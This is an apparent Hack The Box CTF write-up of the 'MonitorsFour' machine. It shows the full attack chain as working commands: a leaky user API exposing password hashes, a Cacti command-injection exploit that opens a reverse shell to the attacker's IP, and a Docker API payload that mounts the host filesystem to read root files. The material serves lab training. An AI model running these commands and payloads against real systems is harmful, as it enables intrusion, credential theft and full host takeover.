---
layout: post
title: MonitorsFour - CTF
date: 2026-03-27
pid: "6840"
category: "CTFs"
difficulty: "EASY"
description: "Chaining API credential leaks with Cacti command injection, and a Docker api exposure to gain root access."
tags: [HTB, Windows, Docker]
unlock_date: 2026-06-13 12:00:00 -0700
---
### 1. Overview
This machine involved chaining multiple web vulnerabilities to gain initial access, followed by exploiting a misconfigured Docker environment to achieve root access. An exposed API endpoint leaked user credentials, which were reused to access a vulnerable Cacti instance. After gaining a shell inside a container, an exposed Docker API was abused to interact with the host system and retrieve the root flag.

### 2. Recon
As always, I started with a standard Nmap scan to find open ports and services.
```
└─$ nmap -sCV 10.129.9.33 --min-rate 5000
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The scan found 2 open ports:
- 80 http
- 5985 Microsoft HTTPAPI

It also identified the domain `monitorsfour.htb`, so I added it to my hosts file.

Before visiting the site, I started subdomain fuzzing, which found the following subomain:
```
└─$ ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
```

Next, I ran a directory scan against the main site:
```
└─$ ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 202ms]
login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 204ms]
contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 816ms]
static                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 202ms]
views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 200ms]
```

When requesting the `/user` endpoint, the server returned an error for a missing parameter:
```
└─$ curl -s http://monitorsfour.htb/user        
{"error":"Missing token parameter"} 
```

Adding the token parameter returned a full list of users along with their password hashes:
```
└─$ curl -s http://monitorsfour.htb/user?token=0 | jq .
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  }
  ...[SNIP]...
]
```

Using Crack Station found that the admin password was: `wonderful1`
### 3. Foothold
With valid credentials, I moved to the `cacti.monitorsfour.htb` subdomain. The footer revealed the application version `1.2.28`. This version is vulnerable to `CVE-2025-22604`.

The vulnerability exists in the SNMP result parser, where improperly handled multi-line input allows command injection for authenticated users.

Using the credentials recovered earlier (`marcus:wonderful1`), I logged into the application.

After preparing a netcat listener, I used a public proof-of-concept exploit to trigger the vulnerability and execute a reverse shell.
```
└─$ python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.160 -l 9001 --url http://cacti.monitorsfour.htb
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: GjE5t.php
[+] Got payload: /bash
[i] Created PHP filename: 3alHt.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

This gave me a shell as the `www-data` user.

### 4. Root
Once inside the system, I began enumeration. The first thing I noticed was that the hostname looked like a container ID:
```
www-data@821fbd6a43fa:~/html/cacti$ hostname
hostname
821fbd6a43fa
```

This suggested that I was inside a Docker container.

I tried to access the Docker API using the default hostname:
```
www-data@821fbd6a43fa:~/html/cacti$ curl -v http://host.docker.internal:2375/version
* connect to 192.168.65.254 port 2375 from 172.18.0.3 port 35674 failed: Connection refused
```

This failed, so I scanned the local subnet for an exposed Docker API:
```
www-data@821fbd6a43fa:~/html/cacti$ for i in $(seq 1 254); do (curl -s --connect-timeout 2 http://192.168.65.$i:2375/version | grep -i "version" && echo "192.168.65.$i") & done; wait
```

This identified a reachable host as `192.168.65.7`

Sending a request to this endpoint confirmed that the Docker API was exposed without authentication
```
www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/version
curl -s http://192.168.65.7:2375/version
{
  "Platform": {
    "Name": "Docker Engine - Community"
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "28.3.2",
      "Details": {
        "ApiVersion": "1.51",
        "Arch": "amd64",
        "BuildTime": "2025-07-09T16:13:55.000000000+00:00",
        "Experimental": "false",
        "GitCommit": "e77ff99",
        "GoVersion": "go1.24.5",
        "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
        "MinAPIVersion": "1.24",
        "Os": "linux"
      }
    },
    {
      "Name": "containerd",
      "Version": "1.7.27",
      "Details": {
        "GitCommit": "05044ec0a9a75232cad458027ca83437aae3f4da"
      }
    },
    {
      "Name": "runc",
      "Version": "1.2.5",
      "Details": {
        "GitCommit": "v1.2.5-0-g59923ef"
      }
    },
    {
      "Name": "docker-init",
      "Version": "0.19.0",
      "Details": {
        "GitCommit": "de40ad0"
      }
    }
  ],
  "Version": "28.3.2",
  "ApiVersion": "1.51",
  "MinAPIVersion": "1.24",
  "GitCommit": "e77ff99",
  "GoVersion": "go1.24.5",
  "Os": "linux",
  "Arch": "amd64",
  "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
  "BuildTime": "2025-07-09T16:13:55.000000000+00:00"
}
```

While researching this setup, I found `CVE-2025-9074`. This vulnerability allows containers to access the Docker Engine API over the internal network, giving control over the host’s Docker daemon.

To exploit this CVE, I first made a payload that mounts the host filesystem:
```
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

I then used the Docker API to create a new container:
```
www-data@821fbd6a43fa:/dev/shm$ curl -X POST -H "Content-Type: application/json" -d @/dev/shm/container.json http://192.168.65.7:2375/containers/create?name=bash
```

Next, I started the container:
```
www-data@821fbd6a43fa:/dev/shm$ curl -X POST http://192.168.65.7:2375/containers/b676f52d63f3/start
```

Finally, I got the output:
```
www-data@821fbd6a43fa:/dev/shm$ curl http://192.168.65.7:2375/containers/b676f52d63f3/logs?stdout=true
```

This returned the contents of the root flag from the host system.
### 5. Conclusion
Initial access was gained through an exposed API endpoint that leaked user credentials, which were then cracked and reused to log into a vulnerable Cacti instance. Exploiting a command injection vulnerability in Cacti provided a shell inside a Docker container.

From there, an exposed Docker API on the internal network was found and abused to create and run containers on the host system. By mounting the host filesystem into a new container, it was possible to access sensitive files and basically gain root-level access.
